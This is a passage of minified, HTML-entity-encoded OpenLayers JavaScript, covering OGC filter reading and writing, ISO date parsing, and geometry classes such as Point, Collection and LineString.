OpenLayers.Filter.Comparison,this)&#125;,CLASS_NAME:"OpenLayers.Filter.Comparison"&#125;);OpenLayers.Filter.Comparison.EQUAL_TO="==";OpenLayers.Filter.Comparison.NOT_EQUAL_TO="!=";OpenLayers.Filter.Comparison.LESS_THAN="&lt;";OpenLayers.Filter.Comparison.GREATER_THAN="&gt;";OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO="&lt;=";OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO="&gt;=";OpenLayers.Filter.Comparison.BETWEEN="..";OpenLayers.Filter.Comparison.LIKE="~";OpenLayers.Filter.Comparison.IS_NULL="NULL";OpenLayers.Format.Filter=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.0.0",CLASS_NAME:"OpenLayers.Format.Filter"&#125;);OpenLayers.Filter.Function=OpenLayers.Class(OpenLayers.Filter,&#123;name:null,params:null,CLASS_NAME:"OpenLayers.Filter.Function"&#125;);OpenLayers.Date=&#123;dateRegEx:/^(?:(\d&#123;4&#125;)(?:-(\d&#123;2&#125;)(?:-(\d&#123;2&#125;))?)?)?(?:(?:T(\d&#123;1,2&#125;):(\d&#123;2&#125;):(\d&#123;2&#125;(?:\.\d+)?)(Z|(?:[+-]\d&#123;1,2&#125;(?::(\d&#123;2&#125;))?)))|Z)?$/,toISOString:function()&#123;return"toISOString"in Date.prototype?function(a)&#123;return a.toISOString()&#125;:function(a)&#123;return isNaN(a.getTime())?"Invalid Date":a.getUTCFullYear()+"-"+OpenLayers.Number.zeroPad(a.getUTCMonth()+1,2)+"-"+OpenLayers.Number.zeroPad(a.getUTCDate(),2)+"T"+OpenLayers.Number.zeroPad(a.getUTCHours(),2)+":"+OpenLayers.Number.zeroPad(a.getUTCMinutes(),2)+":"+OpenLayers.Number.zeroPad(a.getUTCSeconds(),2)+"."+OpenLayers.Number.zeroPad(a.getUTCMilliseconds(),3)+"Z"&#125;&#125;(),parse:function(a)&#123;var b;if((a=a.match(this.dateRegEx))&amp;&amp;(a[1]||a[7]))&#123;b=parseInt(a[1],10)||0;var c=parseInt(a[2],10)-1||0,d=parseInt(a[3],10)||1;b=new Date(Date.UTC(b,c,d));if(c=a[7])&#123;var d=parseInt(a[4],10),e=parseInt(a[5],10),f=parseFloat(a[6]),g=f|0,f=Math.round(1E3*(f-g));b.setUTCHours(d,e,g,f);"Z"!==c&amp;&amp;(c=parseInt(c,10),a=parseInt(a[8],10)||0,a=-1E3*(60*60*c+60*a),b=new Date(b.getTime()+a))&#125;&#125;else b=new Date("invalid");return b&#125;&#125;;OpenLayers.Format.Filter.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ogc:"http://www.opengis.net/ogc",gml:"http://www.opengis.net/gml",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,defaultPrefix:"ogc",schemaLocation:null,initialize:function(a)&#123;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])&#125;,read:function(a)&#123;var b=&#123;&#125;;this.readers.ogc.Filter.apply(this,[a,b]);return b.filter&#125;,readers:&#123;ogc:&#123;_expression:function(a)&#123;for(var b="",c=a.firstChild;c;c=c.nextSibling)switch(c.nodeType)&#123;case 1:a=this.readNode(c);a.property?b+="$&#123;"+a.property+"&#125;":void 0!==a.value&amp;&amp;(b+=a.value);break;case 3:case 4:b+=c.nodeValue&#125;return b&#125;,Filter:function(a,b)&#123;var c=&#123;fids:[],filters:[]&#125;;this.readChildNodes(a,c);0&lt;c.fids.length?b.filter=new OpenLayers.Filter.FeatureId(&#123;fids:c.fids&#125;):0&lt;c.filters.length&amp;&amp;(b.filter=c.filters[0])&#125;,FeatureId:function(a,b)&#123;var c=a.getAttribute("fid");c&amp;&amp;b.fids.push(c)&#125;,And:function(a,b)&#123;var c=new OpenLayers.Filter.Logical(&#123;type:OpenLayers.Filter.Logical.AND&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,Or:function(a,b)&#123;var c=new OpenLayers.Filter.Logical(&#123;type:OpenLayers.Filter.Logical.OR&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,Not:function(a,b)&#123;var c=new OpenLayers.Filter.Logical(&#123;type:OpenLayers.Filter.Logical.NOT&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsLessThan:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.LESS_THAN&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsGreaterThan:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.GREATER_THAN&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsLessThanOrEqualTo:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsGreaterThanOrEqualTo:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsBetween:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.BETWEEN&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,Literal:function(a,b)&#123;b.value=OpenLayers.String.numericIf(this.getChildValue(a),!0)&#125;,PropertyName:function(a,b)&#123;b.property=this.getChildValue(a)&#125;,LowerBoundary:function(a,b)&#123;b.lowerBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,a),!0)&#125;,UpperBoundary:function(a,b)&#123;b.upperBoundary=OpenLayers.String.numericIf(this.readers.ogc._expression.call(this,a),!0)&#125;,Intersects:function(a,b)&#123;this.readSpatial(a,b,OpenLayers.Filter.Spatial.INTERSECTS)&#125;,Within:function(a,b)&#123;this.readSpatial(a,b,OpenLayers.Filter.Spatial.WITHIN)&#125;,Contains:function(a,b)&#123;this.readSpatial(a,b,OpenLayers.Filter.Spatial.CONTAINS)&#125;,DWithin:function(a,b)&#123;this.readSpatial(a,b,OpenLayers.Filter.Spatial.DWITHIN)&#125;,Distance:function(a,b)&#123;b.distance=parseInt(this.getChildValue(a));b.distanceUnits=a.getAttribute("units")&#125;,Function:function(a,b)&#123;&#125;,PropertyIsNull:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.IS_NULL&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;&#125;&#125;,readSpatial:function(a,b,c)&#123;c=new OpenLayers.Filter.Spatial(&#123;type:c&#125;);this.readChildNodes(a,c);c.value=c.components[0];delete c.components;b.filters.push(c)&#125;,encodeLiteral:function(a)&#123;a instanceof Date&amp;&amp;(a=OpenLayers.Date.toISOString(a));return a&#125;,writeOgcExpression:function(a,b)&#123;a instanceof OpenLayers.Filter.Function?this.writeNode("Function",a,b):this.writeNode("Literal",a,b);return b&#125;,write:function(a)&#123;return this.writers.ogc.Filter.apply(this,[a])&#125;,writers:&#123;ogc:&#123;Filter:function(a)&#123;var b=this.createElementNSPlus("ogc:Filter");this.writeNode(this.getFilterType(a),a,b);return b&#125;,_featureIds:function(a)&#123;for(var b=this.createDocumentFragment(),c=0,d=a.fids.length;c&lt;d;++c)this.writeNode("ogc:FeatureId",a.fids[c],b);return b&#125;,FeatureId:function(a)&#123;return this.createElementNSPlus("ogc:FeatureId",&#123;attributes:&#123;fid:a&#125;&#125;)&#125;,And:function(a)&#123;for(var b=this.createElementNSPlus("ogc:And"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),c,b);return b&#125;,Or:function(a)&#123;for(var b=this.createElementNSPlus("ogc:Or"),c,d=0,e=a.filters.length;d&lt;e;++d)c=a.filters[d],this.writeNode(this.getFilterType(c),c,b);return b&#125;,Not:function(a)&#123;var b=this.createElementNSPlus("ogc:Not");a=a.filters[0];this.writeNode(this.getFilterType(a),a,b);return b&#125;,PropertyIsLessThan:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsLessThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsGreaterThan:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsGreaterThan");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsLessThanOrEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsLessThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsGreaterThanOrEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsGreaterThanOrEqualTo");this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsBetween:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsBetween");this.writeNode("PropertyName",a,b);this.writeNode("LowerBoundary",a,b);this.writeNode("UpperBoundary",a,b);return b&#125;,PropertyName:function(a)&#123;return this.createElementNSPlus("ogc:PropertyName",&#123;value:a.property&#125;)&#125;,Literal:function(a)&#123;return this.createElementNSPlus("ogc:Literal",&#123;value:(this.encodeLiteral||OpenLayers.Format.Filter.v1.prototype.encodeLiteral)(a)&#125;)&#125;,LowerBoundary:function(a)&#123;var b=this.createElementNSPlus("ogc:LowerBoundary");this.writeOgcExpression(a.lowerBoundary,b);return b&#125;,UpperBoundary:function(a)&#123;var b=this.createElementNSPlus("ogc:UpperBoundary");this.writeNode("Literal",a.upperBoundary,b);return b&#125;,INTERSECTS:function(a)&#123;return this.writeSpatial(a,"Intersects")&#125;,WITHIN:function(a)&#123;return this.writeSpatial(a,"Within")&#125;,CONTAINS:function(a)&#123;return this.writeSpatial(a,"Contains")&#125;,DWITHIN:function(a)&#123;var b=this.writeSpatial(a,"DWithin");this.writeNode("Distance",a,b);return b&#125;,Distance:function(a)&#123;return this.createElementNSPlus("ogc:Distance",&#123;attributes:&#123;units:a.distanceUnits&#125;,value:a.distance&#125;)&#125;,Function:function(a)&#123;var b=this.createElementNSPlus("ogc:Function",&#123;attributes:&#123;name:a.name&#125;&#125;);a=a.params;for(var c=0,d=a.length;c&lt;d;c++)this.writeOgcExpression(a[c],b);return b&#125;,PropertyIsNull:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsNull");this.writeNode("PropertyName",a,b);return b&#125;&#125;&#125;,getFilterType:function(a)&#123;var b=this.filterMap[a.type];if(!b)throw"Filter writing not supported for rule type: "+a.type;return b&#125;,filterMap:&#123;"&amp;&amp;":"And","||":"Or","!":"Not","==":"PropertyIsEqualTo","!=":"PropertyIsNotEqualTo","&lt;":"PropertyIsLessThan","&gt;":"PropertyIsGreaterThan","&lt;=":"PropertyIsLessThanOrEqualTo","&gt;=":"PropertyIsGreaterThanOrEqualTo","..":"PropertyIsBetween","~":"PropertyIsLike",NULL:"PropertyIsNull",BBOX:"BBOX",DWITHIN:"DWITHIN",WITHIN:"WITHIN",CONTAINS:"CONTAINS",INTERSECTS:"INTERSECTS",FID:"_featureIds"&#125;,CLASS_NAME:"OpenLayers.Format.Filter.v1"&#125;);OpenLayers.Geometry=OpenLayers.Class(&#123;id:null,parent:null,bounds:null,initialize:function()&#123;this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_")&#125;,destroy:function()&#123;this.bounds=this.id=null&#125;,clone:function()&#123;return new OpenLayers.Geometry&#125;,setBounds:function(a)&#123;a&amp;&amp;(this.bounds=a.clone())&#125;,clearBounds:function()&#123;this.bounds=null;this.parent&amp;&amp;this.parent.clearBounds()&#125;,extendBounds:function(a)&#123;this.getBounds()?this.bounds.extend(a):this.setBounds(a)&#125;,getBounds:function()&#123;null==this.bounds&amp;&amp;this.calculateBounds();return this.bounds&#125;,calculateBounds:function()&#123;&#125;,distanceTo:function(a,b)&#123;&#125;,getVertices:function(a)&#123;&#125;,atPoint:function(a,b,c)&#123;var d=!1;null!=this.getBounds()&amp;&amp;null!=a&amp;&amp;(b=null!=b?b:0,c=null!=c?c:0,d=(new OpenLayers.Bounds(this.bounds.left-b,this.bounds.bottom-c,this.bounds.right+b,this.bounds.top+c)).containsLonLat(a));return d&#125;,getLength:function()&#123;return 0&#125;,getArea:function()&#123;return 0&#125;,getCentroid:function()&#123;return null&#125;,toString:function()&#123;return OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT?OpenLayers.Format.WKT.prototype.write(new OpenLayers.Feature.Vector(this)):Object.prototype.toString.call(this)&#125;,CLASS_NAME:"OpenLayers.Geometry"&#125;);OpenLayers.Geometry.fromWKT=function(a)&#123;var b;if(OpenLayers.Format&amp;&amp;OpenLayers.Format.WKT)&#123;var c=OpenLayers.Geometry.fromWKT.format;c||(c=new OpenLayers.Format.WKT,OpenLayers.Geometry.fromWKT.format=c);a=c.read(a);if(a instanceof OpenLayers.Feature.Vector)b=a.geometry;else if(OpenLayers.Util.isArray(a))&#123;b=a.length;for(var c=Array(b),d=0;d&lt;b;++d)c[d]=a[d].geometry;b=new OpenLayers.Geometry.Collection(c)&#125;&#125;return b&#125;;OpenLayers.Geometry.segmentsIntersect=function(a,b,c)&#123;var d=c&amp;&amp;c.point;c=c&amp;&amp;c.tolerance;var e=!1,f=a.x1-b.x1,g=a.y1-b.y1,h=a.x2-a.x1,k=a.y2-a.y1,l=b.y2-b.y1,m=b.x2-b.x1,n=l*h-m*k,l=m*g-l*f,g=h*g-k*f;0==n?0==l&amp;&amp;0==g&amp;&amp;(e=!0):(f=l/n,n=g/n,0&lt;=f&amp;&amp;(1&gt;=f&amp;&amp;0&lt;=n&amp;&amp;1&gt;=n)&amp;&amp;(d?(h=a.x1+f*h,n=a.y1+f*k,e=new OpenLayers.Geometry.Point(h,n)):e=!0));if(c)if(e)&#123;if(d)a:for(a=[a,b],b=0;2&gt;b;++b)for(f=a[b],k=1;3&gt;k;++k)if(h=f["x"+k],n=f["y"+k],d=Math.sqrt(Math.pow(h-e.x,2)+Math.pow(n-e.y,2)),d&lt;c)&#123;e.x=h;e.y=n;break a&#125;&#125;else a:for(a=[a,b],b=0;2&gt;b;++b)for(h=a[b],n=a[(b+1)%2],k=1;3&gt;k;++k)if(f=&#123;x:h["x"+k],y:h["y"+k]&#125;,g=OpenLayers.Geometry.distanceToSegment(f,n),g.distance&lt;c)&#123;e=d?new OpenLayers.Geometry.Point(f.x,f.y):!0;break a&#125;return e&#125;;OpenLayers.Geometry.distanceToSegment=function(a,b)&#123;var c=OpenLayers.Geometry.distanceSquaredToSegment(a,b);c.distance=Math.sqrt(c.distance);return c&#125;;OpenLayers.Geometry.distanceSquaredToSegment=function(a,b)&#123;var c=a.x,d=a.y,e=b.x1,f=b.y1,g=b.x2,h=b.y2,k=g-e,l=h-f,m=(k*(c-e)+l*(d-f))/(Math.pow(k,2)+Math.pow(l,2));0&gt;=m||(1&lt;=m?(e=g,f=h):(e+=m*k,f+=m*l));return&#123;distance:Math.pow(e-c,2)+Math.pow(f-d,2),x:e,y:f,along:m&#125;&#125;;OpenLayers.Geometry.Point=OpenLayers.Class(OpenLayers.Geometry,&#123;x:null,y:null,initialize:function(a,b)&#123;OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.x=parseFloat(a);this.y=parseFloat(b)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Geometry.Point(this.x,this.y));OpenLayers.Util.applyDefaults(a,this);return a&#125;,calculateBounds:function()&#123;this.bounds=new OpenLayers.Bounds(this.x,this.y,this.x,this.y)&#125;,distanceTo:function(a,b)&#123;var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g,h;a instanceofOpenLayers.Geometry.Point?(e=this.x,f=this.y,g=a.x,h=a.y,d=Math.sqrt(Math.pow(e-g,2)+Math.pow(f-h,2)),d=c?&#123;x0:e,y0:f,x1:g,y1:h,distance:d&#125;:d):(d=a.distanceTo(this,b),c&amp;&amp;(d=&#123;x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0,distance:d.distance&#125;));return d&#125;,equals:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b&#125;,toShortString:function()&#123;return this.x+", "+this.y&#125;,move:function(a,b)&#123;this.x+=a;this.y+=b;this.clearBounds()&#125;,rotate:function(a,b)&#123;a*=Math.PI/180;var c=this.distanceTo(b),d=a+Math.atan2(this.y-b.y,this.x-b.x);this.x=b.x+c*Math.cos(d);this.y=b.y+c*Math.sin(d);this.clearBounds()&#125;,getCentroid:function()&#123;return new OpenLayers.Geometry.Point(this.x,this.y)&#125;,resize:function(a,b,c)&#123;this.x=b.x+a*(void 0==c?1:c)*(this.x-b.x);this.y=b.y+a*(this.y-b.y);this.clearBounds();return this&#125;,intersects:function(a)&#123;var b=!1;return b="OpenLayers.Geometry.Point"==a.CLASS_NAME?this.equals(a):a.intersects(this)&#125;,transform:function(a,b)&#123;a&amp;&amp;b&amp;&amp;(OpenLayers.Projection.transform(this,a,b),this.bounds=null);return this&#125;,getVertices:function(a)&#123;return[this]&#125;,CLASS_NAME:"OpenLayers.Geometry.Point"&#125;);OpenLayers.Geometry.Collection=OpenLayers.Class(OpenLayers.Geometry,&#123;components:null,componentTypes:null,initialize:function(a)&#123;OpenLayers.Geometry.prototype.initialize.apply(this,arguments);this.components=[];null!=a&amp;&amp;this.addComponents(a)&#125;,destroy:function()&#123;this.components.length=0;this.components=null;OpenLayers.Geometry.prototype.destroy.apply(this,arguments)&#125;,clone:function()&#123;for(var a=eval("new "+this.CLASS_NAME+"()"),b=0,c=this.components.length;b&lt;c;b++)a.addComponent(this.components[b].clone());OpenLayers.Util.applyDefaults(a,this);return a&#125;,getComponentsString:function()&#123;for(var a=[],b=0,c=this.components.length;b&lt;c;b++)a.push(this.components[b].toShortString());return a.join(",")&#125;,calculateBounds:function()&#123;this.bounds=null;var a=new OpenLayers.Bounds,b=this.components;if(b)for(var c=0,d=b.length;c&lt;d;c++)a.extend(b[c].getBounds());null!=a.left&amp;&amp;(null!=a.bottom&amp;&amp;null!=a.right&amp;&amp;null!=a.top)&amp;&amp;this.setBounds(a)&#125;,addComponents:function(a)&#123;OpenLayers.Util.isArray(a)||(a=[a]);for(var b=0,c=a.length;b&lt;c;b++)this.addComponent(a[b])&#125;,addComponent:function(a,b)&#123;var c=!1;if(a&amp;&amp;(null==this.componentTypes||-1&lt;OpenLayers.Util.indexOf(this.componentTypes,a.CLASS_NAME)))&#123;if(null!=b&amp;&amp;b&lt;this.components.length)&#123;var c=this.components.slice(0,b),d=this.components.slice(b,this.components.length);c.push(a);this.components=c.concat(d)&#125;else this.components.push(a);a.parent=this;this.clearBounds();c=!0&#125;return c&#125;,removeComponents:function(a)&#123;var b=!1;OpenLayers.Util.isArray(a)||(a=[a]);for(var c=a.length-1;0&lt;=c;--c)b=this.removeComponent(a[c])||b;return b&#125;,removeComponent:function(a)&#123;OpenLayers.Util.removeItem(this.components,a);this.clearBounds();return!0&#125;,getLength:function()&#123;for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getLength();return a&#125;,getArea:function()&#123;for(var a=0,b=0,c=this.components.length;b&lt;c;b++)a+=this.components[b].getArea();return a&#125;,getGeodesicArea:function(a)&#123;for(var b=0,c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicArea(a);return b&#125;,getCentroid:function(a)&#123;if(!a)return this.components.length&amp;&amp;this.components[0].getCentroid();a=this.components.length;if(!a)return!1;for(var b=[],c=[],d=0,e=Number.MAX_VALUE,f,g=0;g&lt;a;++g)&#123;f=this.components[g];var h=f.getArea();f=f.getCentroid(!0);isNaN(h)||(isNaN(f.x)||isNaN(f.y))||(b.push(h),d+=h,e=h&lt;e&amp;&amp;0&lt;h?h:e,c.push(f))&#125;a=b.length;if(0===d)&#123;for(g=0;g&lt;a;++g)b[g]=1;d=b.length&#125;else&#123;for(g=0;g&lt;a;++g)b[g]/=e;d/=e&#125;for(var k=e=0,g=0;g&lt;a;++g)f=c[g],h=b[g],e+=f.x*h,k+=f.y*h;return new OpenLayers.Geometry.Point(e/d,k/d)&#125;,getGeodesicLength:function(a)&#123;for(var b=0,c=0,d=this.components.length;c&lt;d;c++)b+=this.components[c].getGeodesicLength(a);return b&#125;,move:function(a,b)&#123;for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].move(a,b)&#125;,rotate:function(a,b)&#123;for(var c=0,d=this.components.length;c&lt;d;++c)this.components[c].rotate(a,b)&#125;,resize:function(a,b,c)&#123;for(var d=0;d&lt;this.components.length;++d)this.components[d].resize(a,b,c);return this&#125;,distanceTo:function(a,b)&#123;for(var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e,f,g=Number.POSITIVE_INFINITY,h=0,k=this.components.length;h&lt;k&amp;&amp;!(d=this.components[h].distanceTo(a,b),f=c?d.distance:d,f&lt;g&amp;&amp;(g=f,e=d,0==g));++h);return e&#125;,equals:function(a)&#123;var b=!0;if(a&amp;&amp;a.CLASS_NAME&amp;&amp;this.CLASS_NAME==a.CLASS_NAME)if(OpenLayers.Util.isArray(a.components)&amp;&amp;a.components.length==this.components.length)for(var c=0,d=this.components.length;c&lt;d;++c)&#123;if(!this.components[c].equals(a.components[c]))&#123;b=!1;break&#125;&#125;else b=!1;else b=!1;return b&#125;,transform:function(a,b)&#123;if(a&amp;&amp;b)&#123;for(var c=0,d=this.components.length;c&lt;d;c++)this.components[c].transform(a,b);this.bounds=null&#125;return this&#125;,intersects:function(a)&#123;for(var b=!1,c=0,d=this.components.length;c&lt;d&amp;&amp;!(b=a.intersects(this.components[c]));++c);return b&#125;,getVertices:function(a)&#123;for(var b=[],c=0,d=this.components.length;c&lt;d;++c)Array.prototype.push.apply(b,this.components[c].getVertices(a));return b&#125;,CLASS_NAME:"OpenLayers.Geometry.Collection"&#125;);OpenLayers.Geometry.MultiPoint=OpenLayers.Class(OpenLayers.Geometry.Collection,&#123;componentTypes:["OpenLayers.Geometry.Point"],addPoint:function(a,b)&#123;this.addComponent(a,b)&#125;,removePoint:function(a)&#123;this.removeComponent(a)&#125;,CLASS_NAME:"OpenLayers.Geometry.MultiPoint"&#125;);OpenLayers.Geometry.Curve=OpenLayers.Class(OpenLayers.Geometry.MultiPoint,&#123;componentTypes:["OpenLayers.Geometry.Point"],getLength:function()&#123;var a=0;if(this.components&amp;&amp;1&lt;this.components.length)for(var b=1,c=this.components.length;b&lt;c;b++)a+=this.components[b-1].distanceTo(this.components[b]);return a&#125;,getGeodesicLength:function(a)&#123;var b=this;if(a)&#123;var c=new OpenLayers.Projection("EPSG:4326");c.equals(a)||(b=this.clone().transform(a,c))&#125;a=0;if(b.components&amp;&amp;1&lt;b.components.length)for(var d,e=1,f=b.components.length;e&lt;f;e++)c=b.components[e-1],d=b.components[e],a+=OpenLayers.Util.distVincenty(&#123;lon:c.x,lat:c.y&#125;,&#123;lon:d.x,lat:d.y&#125;);return 1E3*a&#125;,CLASS_NAME:"OpenLayers.Geometry.Curve"&#125;);OpenLayers.Geometry.LineString=OpenLayers.Class(OpenLayers.Geometry.Curve,&#123;removeComponent:function(a)&#123;var b=this.components&amp;&amp;2&lt;this.components.length;b&amp;&amp;OpenLayers.Geometry.Collection.prototype.removeComponent.apply(this,arguments);return b&#125;,intersects:function(a)&#123;var b=!1,c=a.CLASS_NAME;if("OpenLayers.Geometry.LineString"==c||"OpenLayers.Geometry.LinearRing"==c||"OpenLayers.Geometry.Point"==c)&#123;var d=this.getSortedSegments();a="OpenLayers.Geometry.Point"==c?[&#123;x1:a.x,y1:a.y,x2:a.x,y2:a.y&#125;]:a.getSortedSegments();var e,f,g,h,k,l,m,n=0,p=d.length;a:for(;n&lt;p;++n)&#123;c=d[n];e=c.x1;f=c.x2;g=c.y1;h=c.y2;var q=0,r=a.length;for(;q&lt;r;++q)&#123;k=a[q];if(k.x1&gt;f)break;if(!(k.x2&lt;e||(l=k.y1,m=k.y2,Math.min(l,m)&gt;Math.max(g,h)||Math.max(l,m)&lt;Math.min(g,h)||!OpenLayers.Geometry.segmentsIntersect(c,k))))&#123;b=!0;break a&#125;&#125;&#125;&#125;else b=a.intersects(this);return b&#125;,getSortedSegments:function()&#123;for(var a=this.components.length-1,b=Array(a),c,d,e=0;e&lt;a;++e)c=this.components[e],d=this.components[e+1],b[e]=c.x&lt;d.x?&#123;x1:c.x,y1:c.y,x2:d.x,y2:d.y&#125;:&#123;x1:d.x,y1:d.y,x2:c.x,y2:c.y&#125;;return b.sort(function(a,b)&#123;return a.x1-b.x1&#125;)&#125;,splitWithSegment:function(a,b)&#123;for(var c=!(b&amp;&amp;!1===b.edge),d=b&amp;&amp;b.tolerance,e=[],f=this.getVertices(),g=[],h=[],k=!1,l,m,n,p=&#123;point:!0,tolerance:d&#125;,q=null,r=0,s=f.length-2;r&lt;=s;++r)if(d=f[r],g.push(d.clone()),l=f[r+1],m=&#123;x1:d.x,y1:d.y,x2:l.x,y2:l.y&#125;,m=OpenLayers.Geometry.segmentsIntersect(a,m,p),m instanceof OpenLayers.Geometry.Point&amp;&amp;((n=m.x===a.x1&amp;&amp;m.y===a.y1||m.x===a.x2&amp;&amp;m.y===a.y2||m.equals(d)||m.equals(l)?!0:!1)||c))m.equals(h[h.length-1])||h.push(m.clone()),0===r&amp;&amp;m.equals(d)||m.equals(l)||(k=!0,m.equals(d)||g.push(m),e.push(new OpenLayers.Geometry.LineString(g)),g=[m.clone()]);k&amp;&amp;(g.push(l.clone()),e.push(new OpenLayers.Geometry.LineString(g)));if(0&lt;h.length)var t=a.x1&lt;a.x2?1:-1,u=a.y1&lt;a.y2?1:-1,q=&#123;lines:e,points:h.sort(function(a,b)&#123;return t*a.x-t*b.x||u*a.y-u*b.y&#125;)&#125;;return q&#125;,split:function(a,b)&#123;var c=null,d=b&amp;&amp;b.mutual,e,f,g,h;if(a instanceof OpenLayers.Geometry.LineString)&#123;var k=this.getVertices(),l,m,n,p,q,r=[];g=[];for(var s=0,t=k.length-2;s&lt;=t;++s)&#123;l=k[s];m=k[s+1];n=&#123;x1:l.x,y1:l.y,x2:m.x,y2:m.y&#125;;h=h||[a];d&amp;&amp;r.push(l.clone());for(var u=0;u&lt;h.length;++u)if(p=h[u].splitWithSegment(n,b))if(q=p.lines,0&lt;q.length&amp;&amp;(q.unshift(u,1),Array.prototype.splice.apply(h,q),u+=q.length-2),d)for(var v=0,w=p.points.length;v&lt;w;++v)q=p.points[v],q.equals(l)||(r.push(q),g.push(new OpenLayers.Geometry.LineString(r)),r=q.equals(m)?[]:[q.clone()])&#125;d&amp;&amp;(0&lt;g.length&amp;&amp;0&lt;r.length)&amp;&amp;(r.push(m.clone()),g.push(new OpenLayers.Geometry.LineString(r)))&#125;else c=a.splitWith(this,b);h&amp;&amp;1&lt;h.length?f=!0:h=[];g&amp;&amp;1&lt;g.length?e=!0:g=[];if(f||e)c=d?[g,h]:h;return c&#125;,splitWith:function(a,b)&#123;return a.split(this,b)&#125;,getVertices:function(a)&#123;return!0===a?[this.components[0],this.components[this.components.length-1]]:!1===a?this.components.slice(1,this.components.length-1):this.components.slice()&#125;,distanceTo:function(a,b)&#123;var c=!(b&amp;&amp;!1===b.edge)&amp;&amp;b&amp;&amp;b.details,d,e=&#123;&#125;,f=Number.POSITIVE_INFINITY;if(a instanceof OpenLayers.Geometry.Point)&#123;for(var g=this.getSortedSegments(),h=a.x,k=a.y,l,m=0,n=g.length;m&lt;n;++m)if(l=g[m],d=OpenLayers.Geometry.distanceToSegment(a,l),d.distance&lt;f)&#123;if(f=d.distance,e=d,0===f)break&#125;else if(l.x2&gt;h&amp;&amp;(k&gt;l.y1&amp;&amp;k&lt;l.y2||k&lt;l.y1&amp;&amp;k&gt;l.y2))break;e=c?&#123;distance:e.distance,x0:e.x,y0:e.y,x1:h,y1:k&#125;:e.distance&#125;else if(a instanceof OpenLayers.Geometry.LineString)&#123;var g=this.getSortedSegments(),h=a.getSortedSegments(),p,q,r=h.length,s=&#123;point:!0&#125;,m=0,n=g.length;a:for(;m&lt;n;++m)&#123;k=g[m];l=k.x1;q=k.y1;for(var t=0;t&lt;r;++t)if(d=h[t],p=OpenLayers.Geometry.segmentsIntersect(k,d,s))&#123;f=0;e=&#123;distance:0,x0:p.x,y0:p.y,x1:p.x,y1:p.y&#125;;break a&#125;else d=OpenLayers.Geometry.distanceToSegment(&#123;x:l,y:q&#125;,d),d.distance&lt;f&amp;&amp;(f=d.distance,e=&#123;distance:f,x0:l,y0:q,x1:d.x,y1:d.y&#125;)&#125;c||(e=e.distance);0!==f&amp;&amp;k&amp;&amp;(d=a.distanceTo(new OpenLayers.Geometry.Point(k.x2,k.y2),b),m=c?d.distance:d,m&lt;f&amp;&amp;(e=c?&#123;distance:f,x0:d.x1,y0:d.y1,x1:d.x0,y1:d.y0&#125;:m))&#125;else e=a.distanceTo(this,b),c&amp;&amp;(e=&#123;distance:e.distance,x0:e.x1,y0:e.y1,x1:e.x0,y1:e.y0&#125;);return e&#125;,simplify:function(a)&#123;if(this&amp;&amp;null!==this)&#123;var b=this.getVertices();if(3&gt;b.length)return this;var c=function(a,b,d,k)&#123;for(var l=0,m=0,n=b,p;n&lt;d;n++)&#123;p=a[b];var 